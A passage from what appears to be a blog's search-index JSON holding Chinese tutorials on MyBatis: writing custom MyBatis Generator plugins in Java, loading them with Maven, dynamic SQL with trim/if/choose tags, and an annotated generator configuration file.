&#x2F;&#x2F;添加到Interface context.getCommentGenerator().addGeneralMethodComment(targetMethod,introspectedTable); return targetMethod; &#125; private XmlElement generateUpdateByKeyMapper(IntrospectedTable introspectedTable) &#123; &#x2F;&#x2F;获得表名 String tableName &#x3D; introspectedTable.getAliasedFullyQualifiedTableNameAtRuntime();&#x2F;&#x2F;数据库表名 &#x2F;&#x2F;设定方法节点属性 String methodName &#x3D; METHOD_NAME; &#x2F;&#x2F;方法节点生成 XmlElement methodElement &#x3D; new XmlElement(&quot;update&quot;); methodElement.addAttribute(new Attribute(&quot;id&quot;, methodName)); &#x2F;&#x2F;TRIM节点生成 XmlElement trimElement &#x3D; new XmlElement(&quot;trim&quot;); trimElement.addAttribute(new Attribute(&quot;prefix&quot;,&quot;set&quot;)); trimElement.addAttribute(new Attribute(&quot;suffixOverrides&quot;,&quot;,&quot;)); &#x2F;&#x2F;CHOOSE节点生成 XmlElement chooseElement &#x3D; new XmlElement(&quot;choose&quot;); &#x2F;&#x2F;TRIM节点循环 Iterator&lt;IntrospectedColumn&gt; iterator &#x3D; introspectedTable.getAllColumns().iterator(); &#x2F;&#x2F;最后全空检查字符串 while (iterator.hasNext()) &#123; IntrospectedColumn introspectedColumn &#x3D; iterator.next(); &#x2F;&#x2F;获取#&#123;&#125;参数 数据库表Cloumn名 DO模型成员变量的名 String parameterName &#x3D; MyBatis3FormattingUtilities.getParameterClause(introspectedColumn,&quot;param1.&quot;); String columnName &#x3D; MyBatis3FormattingUtilities.getEscapedColumnName(introspectedColumn); &#x2F;&#x2F;MyBatis3FormattingUtilities是myBatis格式化后的#&#123;param1.id, jdbcType&#x3D;INTEGER&#125;这种 String DOFieldName &#x3D; introspectedColumn.getJavaProperty(); XmlElement ifElement &#x3D; new XmlElement(&quot;if&quot;); &#x2F;&#x2F;TEST条件语句 String ifTestStr &#x3D; &quot;param1.&quot; + DOFieldName + &quot; !&#x3D; null and param2 !&#x3D; \\&#39;&quot; + DOFieldName + &quot;\\&#39;&quot;; &#x2F;&#x2F;IF节点拼接 TextElement ifTextElement &#x3D; new TextElement(columnName + &quot;&#x3D;&quot; + parameterName + &quot;,&quot;); ifElement.addAttribute(new Attribute(&quot;test&quot;,ifTestStr)); ifElement.addElement(ifTextElement); &#x2F;&#x2F;TRIM节点拼接 trimElement.addElement(ifElement); &#x2F;&#x2F;WHENTEST条件语句 String whenTestStr &#x3D; &quot;\\&#39;&quot; + DOFieldName + &quot;\\&#39;&quot; + &quot; &#x3D;&#x3D; param2&quot;; &#x2F;&#x2F;WHEN节点拼接 XmlElement whenElement &#x3D; new XmlElement(&quot;when&quot;); TextElement whenTextElement &#x3D; new TextElement(columnName + &quot;&#x3D;&quot; + parameterName); whenElement.addAttribute(new Attribute(&quot;test&quot;,whenTestStr)); whenElement.addElement(whenTextElement); &#x2F;&#x2F;CHOOSE节点拼接 chooseElement.addElement(whenElement); &#125; &#x2F;&#x2F;CHOOSE最后一个参数全空的IF TextElement otherwiseTextElement &#x3D; new TextElement(&quot;1&#x3D;0&quot;); XmlElement otherwiseElement &#x3D; new XmlElement(&quot;otherwise&quot;); otherwiseElement.addElement(otherwiseTextElement); chooseElement.addElement(otherwiseElement); &#x2F;&#x2F;方法节点拼接 TextElement methodTextElementFirst &#x3D; new TextElement(&quot;update &quot; + tableName); TextElement methodTextElementSecond &#x3D; new TextElement(&quot;where&quot;); methodElement.addElement(methodTextElementFirst); methodElement.addElement(trimElement); methodElement.addElement(methodTextElementSecond); methodElement.addElement(chooseElement); return methodElement; &#125;&#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"DataBase Access Layer(六):MyBatisGenerate自定义Plugin的使用","date":"2016-08-11T11:00:00.000Z","path":"2016/08/11/MyBatisGenerate自定义Plugin的使用/","text":"加载自定义Plugin进入MyBatis配置文件根据文章 MyBatisGenerate配置文件 MyBatisGenerate自定义SQL语句生成 本篇来介绍如何加载自定义的Plugin 严格的顺序由于MyBatisGenerate的配置文件Context节点下是有顺序要求的，所以plugin标签应该放在property和commentGenerator之间 12345&lt;property .....&#x2F;&gt;&lt;plugin type&#x3D;&quot;com.bestpay.psas.dal.plugins.DeletePlugin&quot;&#x2F;&gt;&lt;commentGenerator&gt;.....&lt;&#x2F;commentGenerator&gt; pom的加载由于接口 PluginAdapter 存在于jar包 mybatis-generator-core 中，所以需要在pom文件中加入该坐标，才可以写自定义插件 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;&#x2F;artifactId&gt; &lt;version&gt;1.3.2&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; 当自定义插件书写完成， 应当在MyBatisGenerate的pom中加入你所书写的plugin的Jar包 1234567891011121314151617181920212223242526&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;&#x2F;artifactId&gt; &lt;version&gt;1.3.2&lt;&#x2F;version&gt; &lt;configuration&gt; &lt;verbose&gt;true&lt;&#x2F;verbose&gt; &lt;overwrite&gt;true&lt;&#x2F;overwrite&gt; &lt;configurationFile&gt;src&#x2F;main&#x2F;resources&#x2F;generatorConfig.xml&lt;&#x2F;configurationFile&gt; &lt;&#x2F;configuration&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;mysql.version&#125;&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.company.project&lt;&#x2F;groupId&gt; &lt;artifactId&gt;dal&lt;&#x2F;artifactId&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;包含了自定义Plugin的Jar包 &lt;version&gt;1.0.0-SNAPSHOT&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt; &lt;&#x2F;plugin&gt; &lt;&#x2F;plugins&gt;&lt;&#x2F;build&gt; 使用自定义Generate的方法当完成了以下准备 com.company.project.dal.jar的pom里包含了mybatis-generator-core 在com.company.project.dal包内写了自定义插件plugin mybatis-generator-maven-plugin进行了正确的配置 pulgin内部的dependencies里加载了com.company.project.dal.jar generatorConfiguration里面配置了plugin标签 就可以这样使用Generate 首先使用maven对com.company.project.dal.jar进行LifeCircle中的install 然后再使用maven的Plugins中的mybatis-generator进行生成 为什么要先进行install？ 因为你的自定义插件写在com.company.project.dal.jar中，如果不进行install，通过mybatis-generator的dependency配置读不到最新的jar包，你新写的插件就不能自动生成，参考Maven的生命周期","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"DataBase Access Layer(五):MyBatisGenerate生成自定义SQL方法","date":"2016-08-11T05:00:00.000Z","path":"2016/08/11/MyBatisGenerate生成自定义SQL方法/","text":"为什么要生成自定义SQL在文章动态SQL语句中，为了防止被拖库，有一句判断 1&lt;if test&#x3D;&quot;id &#x3D;&#x3D; null and username &#x3D;&#x3D; null&quot; &gt; 用来判断所有参数为null的情况，这就会引出一个问题: 如果我有10个参数怎么办？ 手动写10个 if判断 和 xx==null 和 and 岂不是要累死爹了。。。 自定义SQL插件通过自定义SQL插件，我们可以对不同的表格产生具有相同的逻辑的SQL语句 如何自定义SQL插件MyBatisGenerate提供了一个PluginAdapter的接口来完成自定义SQL语句操作 1234567891011121314public class SelectPlugin extends PluginAdapter &#123; private final static String METHOD_NAME &#x3D; &quot;select&quot;; public SelectPlugin() &#123; super(); &#125; @Override public boolean validate(List&lt;String&gt; warnings) &#123; return true; &#125; .....&#125; 首先要有两个函数 一个构造函数 重写validate返回为true，如果为false，说明验证不通过，该插件就不会生成对应的SQL方法和XML映射 然后可以声明一个常量当作自定义接口函数名 METHOD_NAME 三个映射方法根据文章MyBatis的核心思想我们知道MyBatis主要是3个映射，所以PluginAdapter就有3个函数分别控制三个映射的生成 123456789101112131415161718192021&#x2F;&#x2F;DO模型生成控制函数，一般模型生成不用自定义所以可以不用重写@Overridepublic boolean modelFieldGenerated(Field field, TopLevelClass topLevelClass, IntrospectedColumn introspectedColumn, IntrospectedTable introspectedTable, ModelClassType modelClassType) &#123; return super.modelFieldGenerated(field, topLevelClass, introspectedColumn, introspectedTable, modelClassType);&#125;&#x2F;&#x2F;接口函数生成控制函数@Overridepublic boolean clientGenerated(Interface interfaze, TopLevelClass topLevelClass, IntrospectedTable introspectedTable) &#123; interfaze.addMethod(generateSelectMethod(introspectedTable));&lt;&#x3D;&#x3D;&#x3D;&#x3D;调用自定义的生成方法 return super.clientGenerated(interfaze, topLevelClass, introspectedTable);&#125;&#x2F;&#x2F;XML SQL语句生成控制函数@Overridepublic boolean sqlMapDocumentGenerated(Document document, IntrospectedTable introspectedTable) &#123; XmlElement parentElement &#x3D; document.getRootElement(); parentElement.addElement(generateSelectMapper(introspectedTable)); &lt;&#x3D;&#x3D;&#x3D;&#x3D;调用自定义的生成方法 return super.sqlMapDocumentGenerated(document, introspectedTable);&#125; 具体的函数调用生命周期(顺序)可以参考MyBatisGenerate中文网，但是里面讲的不够具体，具体的可以去参考MyBatisGenerate源码GitHub中 mybatis-generator-core模块 的 org.mybatis.generator.plugins 包 看我的看不懂的话，强烈推荐去读源码，因为网上教材没有全的 自定义接口函数这里Method并不是Java源生的反射类，而是处于 import org.mybatis.generator.api.dom.java.* 下的类 123456789101112131415private Method generateSelectMethod(IntrospectedTable introspectedTable) &#123; &#x2F;&#x2F;方法名 Method targetMethod &#x3D; new Method(METHOD_NAME); &#x2F;&#x2F;生成返回值 参数 FullyQualifiedJavaType returnType &#x3D; FullyQualifiedJavaType.getNewListInstance(); FullyQualifiedJavaType listAndParameterType &#x3D; new FullyQualifiedJavaType(introspectedTable.getBaseRecordType()); returnType.addTypeArgument(listAndParameterType); &#x2F;&#x2F;设置方法为public 设定返回值 设定参数 targetMethod.setVisibility(JavaVisibility.PUBLIC); targetMethod.setReturnType(returnType); targetMethod.addParameter(new Parameter(listAndParameterType,&quot;record&quot;)); &#x2F;&#x2F;添加到Interface context.getCommentGenerator().addGeneralMethodComment(targetMethod,introspectedTable); return targetMethod;&#125; 自定义XML的SQL语句同自定义接口函数里的Mthod，这里的大部分类也都是由 import org.mybatis.generator.api.dom.xml.* 提供的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465private XmlElement generateSelectMapper(IntrospectedTable introspectedTable) &#123; &#x2F;&#x2F;获得表名 String tableName &#x3D; introspectedTable.getAliasedFullyQualifiedTableNameAtRuntime();&#x2F;&#x2F;数据库表名 &#x2F;&#x2F;设定方法节点属性 String methodName &#x3D; METHOD_NAME; String resultMap &#x3D; introspectedTable.getBaseResultMapId(); String paramterType &#x3D; introspectedTable.getBaseRecordType(); &#x2F;&#x2F;方法节点生成 XmlElement methodElement &#x3D; new XmlElement(&quot;select&quot;); methodElement.addAttribute(new Attribute(&quot;id&quot;, methodName)); methodElement.addAttribute(new Attribute(&quot;resultMap&quot;,resultMap)); methodElement.addAttribute(new Attribute(&quot;parameterType&quot;,paramterType)); &#x2F;&#x2F;TRIM节点生成 XmlElement trimElement &#x3D; new XmlElement(&quot;trim&quot;); trimElement.addAttribute(new Attribute(&quot;prefix&quot;,&quot;WHERE&quot;)); trimElement.addAttribute(new Attribute(&quot;prefixOverrides&quot;,&quot;AND | OR&quot;)); &#x2F;&#x2F;TRIM节点循环 Iterator&lt;IntrospectedColumn&gt; iterator &#x3D; introspectedTable.getAllColumns() .iterator(); &#x2F;&#x2F;Column名称字符串Builder StringBuilder methodTextStr &#x3D; new StringBuilder(); &#x2F;&#x2F;最后全空检查字符串 StringBuilder nullTestStr &#x3D; new StringBuilder(); while (iterator.hasNext()) &#123; IntrospectedColumn introspectedColumn &#x3D; iterator.next(); &#x2F;&#x2F;获取#&#123;&#125;参数 数据库表Cloumn名 DO模型成员变量的名 String parameterName &#x3D; MyBatis3FormattingUtilities.getParameterClause(introspectedColumn); String columnName &#x3D; MyBatis3FormattingUtilities.getEscapedColumnName(introspectedColumn); String DOFieldName &#x3D; introspectedColumn.getJavaProperty(); &#x2F;&#x2F;拼接COLUMN名 methodTextStr.append(columnName); &#x2F;&#x2F;全空检查字符串拼接 nullTestStr.append(DOFieldName + &quot; &#x3D;&#x3D; null&quot;); if (iterator.hasNext()) &#123; methodTextStr.append(&quot;, &quot;); nullTestStr.append(&quot; and &quot;); &#125; &#x2F;&#x2F;TEST条件语句 String testStr &#x3D; DOFieldName + &quot; !&#x3D; null&quot;; &#x2F;&#x2F;IF节点拼接 XmlElement ifElement &#x3D; new XmlElement(&quot;if&quot;); TextElement ifTextElement &#x3D; new TextElement(&quot;AND &quot; + columnName + &quot;&#x3D;&quot; + parameterName); ifElement.addAttribute(new Attribute(&quot;test&quot;,testStr)); ifElement.addElement(ifTextElement); &#x2F;&#x2F;TRIM节点拼接 trimElement.addElement(ifElement); &#125; &#x2F;&#x2F;最后一个参数全空的IF TextElement ifTextElement &#x3D; new TextElement(&quot;AND 1&#x3D;0&quot;); XmlElement ifElement &#x3D; new XmlElement(&quot;if&quot;); ifElement.addAttribute(new Attribute(&quot;test&quot;,nullTestStr.toString())); ifElement.addElement(ifTextElement); trimElement.addElement(ifElement); &#x2F;&#x2F;方法节点拼接 TextElement methodTextElementFirst &#x3D; new TextElement(&quot;select &quot; + methodTextStr.toString()); TextElement methodTextElementSecond &#x3D; new TextElement(&quot;from &quot; + tableName); methodElement.addElement(methodTextElementFirst); methodElement.addElement(methodTextElementSecond); methodElement.addElement(trimElement); return methodElement;&#125; 更多的自定义方法除了本文中trim…if的举例外，另一篇文章多参数的MyBatisGenerate自定义插件 讲解了更复杂的例子，可以做到对模型内参数的具体控制 核心思想是: 拼接XML字符串时可以使用param1代表第一个入参，并且通过param1.id字符串进行参数Getter","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"DataBase Access Layer(五):MyBatis中的动态SQL语句","date":"2016-08-11T04:00:00.000Z","path":"2016/08/11/MyBatis中的动态SQL语句/","text":"动态SQL语句参考MyBatis讲解文章中的User假设，我们有这样一个需求: 想根据传入UserDO模型 id或username中不为null的参数进行查询 均不为null的时候，要同时符合才能查询 均为null的时候不进行查询 SQL语句按照上文需求，三个需求分别要用以下三条SQL语句才能实现 1231. select id, user_id, username, password from users where id&#x3D;xxxx2. select id, user_id, username, password from users where id&#x3D;xxxx and username&#x3D;xxxx3. select id, user_id, username, password from users where 1&#x3D;0 我们可以看出，这三条语句除了where之外的部分重复性很高，所以可以使用MyBatis的动态SQL语句来完成 动态语句标签MyBatis提供了一系列标签可以进行SQL语句的拼接 标签 功能 trim 修剪功能，可以添加去除动态语句的前缀或者后缀 if if判断功能 choose…when…otherwise 多选一功能，类似于swith…case…default 构造动态语句我们利用trim功能可以完成以上的三条语句的动态语句,就可以根据传入的模型不同构造出不同的SQL语句 123456789101112131415&lt;select id&#x3D;&quot;select&quot; resultMap&#x3D;&quot;BaseResultMap&quot; parameterType&#x3D;&quot;com.company.project.dal.model.user.UserDO&quot; &gt; select id, user_id, username, password, salt, login_count, user_status, user_role from o_users &lt;trim prefix&#x3D;&quot;WHERE&quot; prefixOverrides&#x3D;&quot;AND | OR&quot; &gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;开始修剪，添加WHERE前缀，并且去除第一AND &lt;if test&#x3D;&quot;id !&#x3D; null&quot; &gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;进行空值判断，若为空添加内部语句 AND id&#x3D;#&#123;id,jdbcType&#x3D;INTEGER&#125; &lt;&#x2F;if&gt; &lt;if test&#x3D;&quot;username !&#x3D; null&quot; &gt; AND username&#x3D;#&#123;username,jdbcType&#x3D;VARCHAR&#125; &lt;&#x2F;if&gt; &lt;if test&#x3D;&quot;id &#x3D;&#x3D; null and username &#x3D;&#x3D; null&quot; &gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;全部为空的情况下，永远错误 AND 1&#x3D;0 &lt;&#x2F;if&gt; &lt;&#x2F;trim&gt;&lt;&#x2F;select&gt; 注意使用SQL动态语句的时候，不要留下拖库的可能性 在以上的例子中，如果id和username全部为空，很有可能出现这样的语句 1select id, user_id, username, password from users where 为了避免这种情况发生，必须添加 123&lt;if test&#x3D;&quot;id &#x3D;&#x3D; null and username &#x3D;&#x3D; null&quot; &gt; AND 1&#x3D;0&lt;&#x2F;if&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"DataBase Access Layer(四):一份简单可用的MyBatisGenerate配置文件","date":"2016-08-11T03:00:00.000Z","path":"2016/08/11/DAL一份简单可用的MyBatisGenerate配置文件/","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE generatorConfiguration PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD MyBatis Generator Configuration 1.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-generator-config_1_0.dtd&quot;&gt;&lt;!-- 配置生成器 --&gt;&lt;generatorConfiguration&gt; &lt;!-- 可以用于加载配置项或者配置文件，在整个配置文件中就可以使用$&#123;propertyKey&#125;的方式来引用配置项 resource：配置资源加载地址，使用resource，MBG从classpath开始找，比如com&#x2F;myproject&#x2F;generatorConfig.properties url：配置资源加载地质，使用URL的方式，比如file:&#x2F;&#x2F;&#x2F;C:&#x2F;myfolder&#x2F;generatorConfig.properties. 注意，两个属性只能选址一个; 另外，如果使用了mybatis-generator-maven-plugin，那么在pom.xml中定义的properties都可以直接在generatorConfig.xml中使用 &lt;properties resource&#x3D;&quot;&quot; url&#x3D;&quot;&quot; &#x2F;&gt; --&gt; &lt;properties resource&#x3D;&quot;properties&#x2F;generatorConfig.properties&quot;&#x2F;&gt; &lt;!-- 在MBG工作的时候，需要额外加载的依赖包 location属性指明加载jar&#x2F;zip包的全路径 &lt;classPathEntry location&#x3D;&quot;&#x2F;Program Files&#x2F;IBM&#x2F;SQLLIB&#x2F;java&#x2F;db2java.zip&quot; &#x2F;&gt; --&gt; &lt;!-- context:生成一组对象的环境 id:必选，上下文id，用于在生成错误时提示 defaultModelType:指定生成对象的样式 1，conditional：类似hierarchical； 2，flat：所有内容（主键，blob）等全部生成在一个对象中； 3，hierarchical：主键生成一个XXKey对象(key class)，Blob等单独生成一个对象，其他简单属性在一个对象中(record class) targetRuntime: 1，MyBatis3：默认的值，生成基于MyBatis3.x以上版本的内容，包括XXXBySample； 2，MyBatis3Simple：类似MyBatis3，只是不生成XXXBySample； introspectedColumnImpl：类全限定名，用于扩展MBG --&gt; &lt;context id&#x3D;&quot;mysql&quot; defaultModelType&#x3D;&quot;hierarchical&quot; targetRuntime&#x3D;&quot;MyBatis3Simple&quot; &gt; &lt;!-- 自动识别数据库关键字，默认false，如果设置为true，根据SqlReservedWords中定义的关键字列表； 一般保留默认值，遇到数据库关键字（Java关键字），使用columnOverride覆盖 --&gt; &lt;property name&#x3D;&quot;autoDelimitKeywords&quot; value&#x3D;&quot;false&quot;&#x2F;&gt; &lt;!-- 生成的Java文件的编码 --&gt; &lt;property name&#x3D;&quot;javaFileEncoding&quot; value&#x3D;&quot;UTF-8&quot;&#x2F;&gt; &lt;!-- 格式化java代码 --&gt; &lt;property name&#x3D;&quot;javaFormatter&quot; value&#x3D;&quot;org.mybatis.generator.api.dom.DefaultJavaFormatter&quot;&#x2F;&gt; &lt;!-- 格式化XML代码 --&gt; &lt;property name&#x3D;&quot;xmlFormatter&quot; value&#x3D;&quot;org.mybatis.generator.api.dom.DefaultXmlFormatter&quot;&#x2F;&gt; &lt;!-- beginningDelimiter和endingDelimiter：指明数据库的用于标记数据库对象名的符号，比如ORACLE就是双引号，MYSQL默认是&#96;反引号； --&gt; &lt;property name&#x3D;&quot;beginningDelimiter&quot; value&#x3D;&quot;&#96;&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;endingDelimiter&quot; value&#x3D;&quot;&#96;&quot;&#x2F;&gt; &lt;commentGenerator&gt; &lt;property name&#x3D;&quot;suppressAllComments&quot; value&#x3D;&quot;true&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;suppressDate&quot; value&#x3D;&quot;true&quot; &#x2F;&gt; &lt;&#x2F;commentGenerator&gt; &lt;!-- 必须要有的，使用这个配置链接数据库--&gt; &lt;jdbcConnection driverClass&#x3D;&quot;$&#123;jdbc.driver&#125;&quot; connectionURL&#x3D;&quot;$&#123;jdbc.url&#125;&quot; userId&#x3D;&quot;$&#123;jdbc.username&#125;&quot; password&#x3D;&quot;$&#123;jdbc.password&#125;&quot;&gt; &lt;!-- 这里面可以设置property属性，每一个property属性都设置到配置的Driver上 --&gt; &lt;&#x2F;jdbcConnection&gt; &lt;!-- java类型处理器 用于处理DB中的类型到Java中的类型，默认使用JavaTypeResolverDefaultImpl； 注意一点，默认会先尝试使用Integer，Long，Short等来对应DECIMAL和 NUMERIC数据类型； --&gt; &lt;javaTypeResolver type&#x3D;&quot;org.mybatis.generator.internal.types.JavaTypeResolverDefaultImpl&quot;&gt; &lt;!-- true：使用BigDecimal对应DECIMAL和 NUMERIC数据类型 false：默认, scale&gt;0;length&gt;18：使用BigDecimal; scale&#x3D;0;length[10,18]：使用Long； scale&#x3D;0;length[5,9]：使用Integer； scale&#x3D;0;length&lt;5：使用Short； --&gt; &lt;property name&#x3D;&quot;forceBigDecimals&quot; value&#x3D;&quot;false&quot;&#x2F;&gt; &lt;&#x2F;javaTypeResolver&gt; &lt;!-- java模型创建器，是必须要的元素 负责：1，key类（见context的defaultModelType）；2，java类；3，查询类 targetPackage：生成的类要放的包，真实的包受enableSubPackages属性控制； targetProject：目标项目，指定一个存在的目录下，生成的内容会放到指定目录中，如果目录不存在，MBG不会自动建目录 --&gt; &lt;javaModelGenerator targetPackage&#x3D;&quot;$&#123;model.package&#125;&quot; targetProject&#x3D;&quot;src&#x2F;main&#x2F;java&quot;&gt; &lt;!-- for MyBatis3&#x2F;MyBatis3Simple 自动为每一个生成的类创建一个构造方法，构造方法包含了所有的field；而不是使用setter； --&gt; &lt;property name&#x3D;&quot;constructorBased&quot; value&#x3D;&quot;false&quot;&#x2F;&gt; &lt;!-- 在targetPackage的基础上，根据数据库的schema再生成一层package，最终生成的类放在这个package下，默认为false --&gt; &lt;property name&#x3D;&quot;enableSubPackages&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;!-- for MyBatis3 &#x2F; MyBatis3Simple 是否创建一个不可变的类，如果为true， 那么MBG会创建一个没有setter方法的类，取而代之的是类似constructorBased的类 --&gt; &lt;property name&#x3D;&quot;immutable&quot; value&#x3D;&quot;false&quot;&#x2F;&gt; &lt;!-- 设置一个根对象， 如果设置了这个根对象，那么生成的keyClass或者recordClass会继承这个类；在Table的rootClass属性中可以覆盖该选项 注意：如果在key class或者record class中有root class相同的属性，MBG就不会重新生成这些属性了，包括： 1，属性名相同，类型相同，有相同的getter&#x2F;setter方法； --&gt; &lt;!--&lt;property name&#x3D;&quot;rootClass&quot; value&#x3D;&quot;com._520it.mybatis.domain.BaseDomain&quot;&#x2F;&gt;--&gt; &lt;!-- 设置是否在getter方法中，对String类型字段调用trim()方法 --&gt; &lt;property name&#x3D;&quot;trimStrings&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;&#x2F;javaModelGenerator&gt; &lt;!-- 生成SQL map的XML文件生成器， 注意，在Mybatis3之后，我们可以使用mapper.xml文件+Mapper接口（或者不用mapper接口）， 或者只使用Mapper接口+Annotation，所以，如果 javaClientGenerator配置中配置了需要生成XML的话，这个元素就必须配置 targetPackage&#x2F;targetProject:同javaModelGenerator --&gt; &lt;sqlMapGenerator targetPackage&#x3D;&quot;$&#123;xml.mapper.package&#125;&quot; targetProject&#x3D;&quot;src&#x2F;main&#x2F;resources&quot;&gt; &lt;!-- 在targetPackage的基础上，根据数据库的schema再生成一层package，最终生成的类放在这个package下，默认为false --&gt; &lt;property name&#x3D;&quot;enableSubPackages&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;&#x2F;sqlMapGenerator&gt; &lt;!-- 对于mybatis来说，即生成Mapper接口，注意，如果没有配置该元素，那么默认不会生成Mapper接口 targetPackage&#x2F;targetProject:同javaModelGenerator type：选择怎么生成mapper接口（在MyBatis3&#x2F;MyBatis3Simple下）： 1，ANNOTATEDMAPPER：会生成使用Mapper接口+Annotation的方式创建（SQL生成在annotation中），不会生成对应的XML； 2，MIXEDMAPPER：使用混合配置，会生成Mapper接口，并适当添加合适的Annotation，但是XML会生成在XML中； 3，XMLMAPPER：会生成Mapper接口，接口完全依赖XML； 注意，如果context是MyBatis3Simple：只支持ANNOTATEDMAPPER和XMLMAPPER --&gt; &lt;javaClientGenerator targetPackage&#x3D;&quot;$&#123;mapper.package&#125;&quot; type&#x3D;&quot;XMLMAPPER&quot; targetProject&#x3D;&quot;src&#x2F;main&#x2F;java&quot;&gt; &lt;!-- 在targetPackage的基础上，根据数据库的schema再生成一层package，最终生成的类放在这个package下，默认为false --&gt; &lt;property name&#x3D;&quot;enableSubPackages&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;!-- 可以为所有生成的接口添加一个父接口，但是MBG只负责生成，不负责检查 &lt;property name&#x3D;&quot;rootInterface&quot; value&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;&#x2F;javaClientGenerator&gt; &lt;!-- 选择一个table来生成相关文件，可以有一个或多个table，必须要有table元素 选择的table会生成一下文件： 1，SQL map文件 2，生成一个主键类； 3，除了BLOB和主键的其他字段的类； 4，包含BLOB的类； 5，一个用户生成动态查询的条件类（selectByExample, deleteByExample），可选； 6，Mapper接口（可选） tableName（必要）：要生成对象的表名； 注意：大小写敏感问题。正常情况下，MBG会自动的去识别数据库标识符的大小写敏感度，在一般情况下，MBG会 根据设置的schema，catalog或tablename去查询数据表，按照下面的流程： 1，如果schema，catalog或tablename中有空格，那么设置的是什么格式，就精确的使用指定的大小写格式去查询； 2，否则，如果数据库的标识符使用大写的，那么MBG自动把表名变成大写再查找； 3，否则，如果数据库的标识符使用小写的，那么MBG自动把表名变成小写再查找； 4，否则，使用指定的大小写格式查询； 另外的，如果在创建表的时候，使用的&quot;&quot;把数据库对象规定大小写，就算数据库标识符是使用的大写，在这种情况下也会使用给定的大小写来创建表名； 这个时候，请设置delimitIdentifiers&#x3D;&quot;true&quot;即可保留大小写格式； 可选： 1，schema：数据库的schema； 2，catalog：数据库的catalog； 3，alias：为数据表设置的别名，如果设置了alias，那么生成的所有的SELECT SQL语句中，列名会变成：alias_actualColumnName 4，domainObjectName：生成的domain类的名字，如果不设置，直接使用表名作为domain类的名字；可以设置为somepck.domainName，那么会自动把domainName类再放到somepck包里面； 5，enableInsert（默认true）：指定是否生成insert语句； 6，enableSelectByPrimaryKey（默认true）：指定是否生成按照主键查询对象的语句（就是getById或get）； 7，enableSelectByExample（默认true）：MyBatis3Simple为false，指定是否生成动态查询语句； 8，enableUpdateByPrimaryKey（默认true）：指定是否生成按照主键修改对象的语句（即update)； 9，enableDeleteByPrimaryKey（默认true）：指定是否生成按照主键删除对象的语句（即delete）； 10，enableDeleteByExample（默认true）：MyBatis3Simple为false，指定是否生成动态删除语句； 11，enableCountByExample（默认true）：MyBatis3Simple为false，指定是否生成动态查询总条数语句（用于分页的总条数查询）； 12，enableUpdateByExample（默认true）：MyBatis3Simple为false，指定是否生成动态修改语句（只修改对象中不为空的属性）； 13，modelType：参考context元素的defaultModelType，相当于覆盖； 14，delimitIdentifiers：参考tableName的解释，注意，默认的delimitIdentifiers是双引号，如果类似MYSQL这样的数据库，使用的是&#96;（反引号，那么还需要设置context的beginningDelimiter和endingDelimiter属性） 15，delimitAllColumns：设置是否所有生成的SQL中的列名都使用标识符引起来。默认为false，delimitIdentifiers参考context的属性 注意，table里面很多参数都是对javaModelGenerator，context等元素的默认属性的一个复写； --&gt; &lt;table tableName&#x3D;&quot;$&#123;table.name&#125;&quot; domainObjectName&#x3D;&quot;$&#123;table.domainObject&#125;&quot;&gt; &lt;!-- 参考 javaModelGenerator 的 constructorBased属性--&gt; &lt;property name&#x3D;&quot;constructorBased&quot; value&#x3D;&quot;false&quot;&#x2F;&gt; &lt;!-- 默认为false，如果设置为true，在生成的SQL中，table名字不会加上catalog或schema； --&gt; &lt;property name&#x3D;&quot;ignoreQualifiersAtRuntime&quot; value&#x3D;&quot;false&quot;&#x2F;&gt; &lt;!-- 参考 javaModelGenerator 的 immutable 属性 --&gt; &lt;property name&#x3D;&quot;immutable&quot; 